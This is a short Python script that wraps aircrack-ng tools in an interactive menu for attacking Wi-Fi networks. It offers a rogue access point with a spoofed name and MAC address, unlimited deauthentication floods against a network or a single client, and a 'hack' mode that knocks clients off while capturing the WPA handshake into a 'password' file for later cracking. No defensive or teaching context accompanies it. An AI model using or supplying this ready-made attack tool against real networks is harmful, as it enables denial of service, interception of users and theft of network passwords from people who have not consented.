from subprocess import *

try:
    answ = input("-> ")
    if answ == "fake-hot-spot":
        name = input("-> Enter name of fake wifi hot spot: ")
        mac = input("-> Enter mac address of fake wifi hot spot: ")
        ch = input("-> Enter channel number of fake wifi hot spot: ")
        call(["iwconfig"])
        adapter = input("-> Enter name of your network adapter: ")
        call(["airmon-ng", "start", adapter])
        adapter = adapter + "mon"
        call(["airbase-ng", "-a", mac, "--essid", name, "-c", ch, adapter])

    if answ == "deauth-client":
        call(["airmon-ng"])
        adapter = input("-> Enter name of your network adapter: ")
        ch = input("-> Enter channel: ")
        call(["airmon-ng", "start", adapter])
        adapter = adapter + "mon"
        call(["iwconfig", adapter, "channel", ch])
        name = input("-> Enter deauth essid: ")
        client = input("-> Enter deauth client mac: ")
        call(["aireplay-ng", "-0", "0", "-e", name, "-c", client,  adapter])

    if answ == "deauth":
        call(["airmon-ng"])
        adapter = input("-> Enter name of your network adapter: ")
        ch = input("-> Enter channel: ")
        call(["airmon-ng", "start", adapter])
        adapter = adapter + "mon"
        call(["iwconfig", adapter, "channel", ch])
        name = input("-> Enter deauth essid: ")
        call(["aireplay-ng", "-0", "0", "-e", name,  adapter])

    if answ == "hack":
        call(["airmon-ng"])
        adapter = input("-> Enter name of your network adapter: ")
        call(["airmon-ng", "start", adapter])
        ch = input("-> Enter channel: ")
        name = input("-> Enter target essid: ")
        adapter = adapter + "mon"
        call(["iwconfig", adapter, "channel", ch])
        call(["konsole", "-e", "sudo", "aireplay-ng", "-0", "15", "-e", name,  adapter])
        call(["airodump-ng", adapter, "--channel", ch, "-w", "password"])

except KeyboardInterrupt:
    call(["airmon-ng", "stop", adapter])
    print("-> Bye")
